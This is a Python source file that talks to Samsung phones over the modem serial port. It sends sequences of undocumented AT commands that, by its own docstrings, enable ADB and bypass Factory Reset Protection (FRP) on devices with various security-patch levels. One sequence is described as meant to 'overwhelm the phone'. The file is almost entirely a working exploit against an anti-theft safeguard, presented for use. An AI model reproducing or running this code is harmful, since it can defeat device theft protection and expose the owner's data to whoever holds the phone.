
import sys
import time
import serial
import serial.tools.list_ports
import logging
from typing import List, Optional, Callable

class SamsungADBEnabler:
    """
    Handles enabling ADB on Samsung devices using various exploits.
    Based on nPhoneKIT 1.5.0 implementation.
    """

    def __init__(self):
        self.logger = logging.getLogger(__name__)

    def get_samsung_modem_ports(self) -> List:
        """Find Samsung modem ports"""
        ports = list(serial.tools.list_ports.comports())
        samsung_ports = []
        
        for port in ports:
            # Check for Samsung VID/PID or description
            # Samsung VID is commonly 0x04E8
            if port.vid == 0x04E8:
                samsung_ports.append(port)
                self.logger.debug(f"Found Samsung device on: {port.device} - {port.description}")
            elif "samsung" in port.description.lower():
                samsung_ports.append(port)
                self.logger.debug(f"Found potential Samsung device on: {port.device}")
                
        return samsung_ports

    def send_at_command(self, ser: serial.Serial, command: str) -> bool:
        """Send AT command and read response"""
        try:
            full_cmd = command.strip() + "\r\n"
            ser.reset_input_buffer() # Clear old data
            ser.write(full_cmd.encode())
            time.sleep(0.1) # nPhoneKIT uses 0.1s in send()
            
            # Read logic similar to nPhoneKIT
            output = []
            while ser.in_waiting > 0:
                line = ser.readline()
                if not line:
                    break
                decoded_line = line.decode(errors='ignore').strip()
                output.append(decoded_line)
                
            raw_response = "\n".join(output)
            self.logger.debug(f"Sent: {command.strip()}")
            self.logger.debug(f"Response: {raw_response}")
            
            return "OK" in raw_response
        except Exception as e:
            self.logger.error(f"Error sending {command}: {e}")
            return False

    def read_at_response(self, ser: serial.Serial, command: str) -> str:
        """Send AT command and return content response"""
        try:
            full_cmd = command.strip() + "\r\n"
            ser.reset_input_buffer()
            ser.write(full_cmd.encode())
            time.sleep(0.5)
            
            response = ""
            if ser.in_waiting > 0:
                raw_response = ser.read(ser.in_waiting).decode(errors='ignore')
                self.logger.debug(f"Sent: {command.strip()}")
                self.logger.debug(f"Response (Raw): {raw_response.strip()}")
                
                # Filter response
                lines = raw_response.split('\r\n')
                relevant_lines = []
                for line in lines:
                    stripped = line.strip()
                    if not stripped: continue
                    if command.strip() in stripped: continue # Skip echo
                    if stripped == "OK": continue # Skip status
                    if "ERROR" in stripped or "+CME Error" in stripped: return "" # Return empty on error
                    relevant_lines.append(stripped)
                
                response = "\n".join(relevant_lines)
            
            return response.strip()
        except Exception:
            return ""

    def read_device_info(self, port_device: str) -> dict:
        """Read device info via AT commands"""
        info = {
            "model": "Samsung Modem",
            "version": "Unknown"
        }
        self.logger.info(f"Reading device info from {port_device}...")
        try:
            ser = serial.Serial(port_device, 115200, timeout=2) # 115200 baud
            
            # 1. Model (AT+GMM)
            self.logger.debug("Sending AT+GMM...")
            resp = self.read_at_response(ser, "AT+GMM")
            if resp:
                 info["model"] = resp.split('\n')[0] # Take first valid line
                 self.logger.info(f"Got Model: {info['model']}")
            
            # 2. Version methods
            version_cmds = ["AT+VERSNAME=1,0,0", "AT+SWKV=0,2", "AT+GMR"]
            for cmd in version_cmds:
                if info["version"] != "Unknown": break
                
                self.logger.debug(f"Sending {cmd}...")
                resp = self.read_at_response(ser, cmd)
                if resp:
                    if "+VERSNAME:" in resp:
                         parts = resp.split(',')
                         if len(parts) >= 2:
                             info["version"] = parts[1]
                    elif "+SWKV:" in resp:
                        info["version"] = resp.replace("+SWKV:", "").strip()
                    else:
                        info["version"] = resp.split('\n')[0]
                    self.logger.info(f"Got Version ({cmd}): {info['version']}")

            ser.close()
        except Exception as e:
            self.logger.error(f"Error reading device info from {port_device}: {e}")
            
        return info

    def enable_adb(self, port_device: str, progress_callback: Optional[Callable[[str], None]] = None) -> bool:
        """Run the sequence to enable ADB trying multiple methods"""
        self.logger.info(f"Attempting to enable ADB on {port_device}...")
        
        methods = [
            ("Method 2024", self._method_2024),
            ("Method 2022 (Aug-Dec)", self._method_aug2022_dec2022),
            ("Method Pre-2022", self._method_pre_aug2022)
        ]

        try:
            # Open serial port once if possible, or per method
            # Usually better to close/re-open between methods or retries
            
            for name, method in methods:
                 if progress_callback:
                     progress_callback(f"Trying {name}...")
                 self.logger.info(f"Trying {name}...")
                 
                 if method(port_device, progress_callback):
                     self.logger.info(f"{name} sequence completed. Allowing time for ADB to appear.")
                     if progress_callback:
                         progress_callback(f"{name} executed. Checking for ADB...")
                     return True
                 
                 time.sleep(1)

            return False
            
        except Exception as e:
            self.logger.error(f"Unexpected error during enable_adb: {e}")
            if progress_callback:
                 progress_callback(f"Error: {e}")
            return False

    def _execute_sequence(self, port_device: str, commands: List[str], method_name: str, progress_callback: Optional[Callable[[str], None]]) -> bool:
        """Execute a list of AT commands"""
        ser = None
        try:
            ser = serial.Serial(port_device, 115200, timeout=2)
            time.sleep(0.5)
            
            # Dial *#0*# first (common req)
            self.send_at_command(ser, "ATD*#0*#;")
            time.sleep(0.5)

            total = len(commands)
            for i, cmd in enumerate(commands):
                if progress_callback and i % 5 == 0:
                     progress_callback(f"{method_name}: Sending command {i+1}/{total}")
                
                self.send_at_command(ser, cmd)
                # nPhoneKIT doesn't strictly check for OK on every exploit command, just sends them
                
            return True

        except Exception as e:
            self.logger.error(f"[{method_name}] Error: {e}")
            return False
        finally:
            if ser and ser.is_open:
                ser.close()

    def _method_2024(self, port_device: str, progress_callback: Optional[Callable[[str], None]]) -> bool:
        """FRP unlock for early 2024 security patch"""
        commands = [
            "AT+SWATD=0",
            "AT+ACTIVATE=0,0,0",
            "AT+DEVCONINFO",
            "AT+VERSNAME=3.2.3",
            "AT+REACTIVE=1,0,0",
            "AT+SWATD=0",
            "AT+ACTIVATE=0,0,0",
            "AT+SWATD=1",
            "AT+SWATD=1",
            "AT+PRECONFIG=2,VZW",
            "AT+PRECONFIG=1,0",
        ]
        return self._execute_sequence(port_device, commands, "Method 2024", progress_callback)

    def _method_aug2022_dec2022(self, port_device: str, progress_callback: Optional[Callable[[str], None]]) -> bool:
        """FRP unlock for Aug-Dec 2022 security patch"""
        # Long sequence to overwhelm the phone
        commands = ['AT+SWATD=0', 'AT+ACTIVATE=0,0,0', 'AT+DEVCONINFO','AT+KSTRINGB=0,3','AT+DUMPCTRL=1,0', 'AT+DEBUGLVC=0,5','AT+SWATD=0','AT+ACTIVATE=0,0,0','AT+SWATD=1','AT+DEBUGLVC=0,5','AT+KSTRINGB=0,3','AT+DUMPCTRL=1,0','AT+DEBUGLVC=0,5','AT+SWATD=0','AT+ACTIVATE=0,0,0','AT+SWATD=1','AT+DEBUGLVC=0,5','AT+KSTRINGB=0,3','AT+DUMPCTRL=1,0','AT+DEBUGLVC=0,5','AT+SWATD=0','AT+ACTIVATE=0,0,0','AT+SWATD=1','AT+DEBUGLVC=0,5','AT+KSTRINGB=0,3','AT+DUMPCTRL=1,0','AT+DEBUGLVC=0,5','AT+SWATD=0','AT+ACTIVATE=0,0,0','AT+SWATD=1','AT+DEBUGLVC=0,5','AT+KSTRINGB=0,3','AT+DUMPCTRL=1,0','AT+DEBUGLVC=0,5','AT+SWATD=0','AT+ACTIVATE=0,0,0','AT+SWATD=1','AT+DEBUGLVC=0,5','AT+KSTRINGB=0,3','AT+DUMPCTRL=1,0','AT+DEBUGLVC=0,5','AT+SWATD=0','AT+ACTIVATE=0,0,0','AT+SWATD=1','AT+DEBUGLVC=0,5','AT+KSTRINGB=0,3','AT+DUMPCTRL=1,0','AT+DEBUGLVC=0,5','AT+SWATD=0','AT+ACTIVATE=0,0,0','AT+SWATD=1','AT+DEBUGLVC=0,5','AT+KSTRINGB=0,3','AT+DUMPCTRL=1,0','AT+DEBUGLVC=0,5','AT+SWATD=0','AT+ACTIVATE=0,0,0','AT+SWATD=1','AT+DEBUGLVC=0,5','AT+KSTRINGB=0,3','AT+DUMPCTRL=1,0','AT+DEBUGLVC=0,5','AT+SWATD=0','AT+ACTIVATE=0,0,0','AT+SWATD=1','AT+DEBUGLVC=0,5','AT+KSTRINGB=0,3','AT+DUMPCTRL=1,0','AT+DEBUGLVC=0,5','AT+SWATD=0','AT+ACTIVATE=0,0,0','AT+SWATD=1','AT+DEBUGLVC=0,5','AT+KSTRINGB=0,3','AT+DUMPCTRL=1,0','AT+DEBUGLVC=0,5','AT+SWATD=0','AT+ACTIVATE=0,0,0','AT+SWATD=1','AT+DEBUGLVC=0,5','AT+KSTRINGB=0,3','AT+DUMPCTRL=1,0','AT+DEBUGLVC=0,5','AT+SWATD=0','AT+ACTIVATE=0,0,0','AT+SWATD=1','AT+DEBUGLVC=0,5','AT+KSTRINGB=0,3','AT+DUMPCTRL=1,0','AT+DEBUGLVC=0,5']
        return self._execute_sequence(port_device, commands, "Method 2022", progress_callback)

    def _method_pre_aug2022(self, port_device: str, progress_callback: Optional[Callable[[str], None]]) -> bool:
        """FRP unlock for pre-Aug 2022 security patch"""
        commands = [
            "AT+DUMPCTRL=1,0",
            "AT+DEBUGLVC=0,5",
            "AT+SWATD=0",
            "AT+ACTIVATE=0,0,0",
            "AT+SWATD=1",
            "AT+DEBUGLVC=0,5"
        ]
        return self._execute_sequence(port_device, commands, "Method Pre-2022", progress_callback)
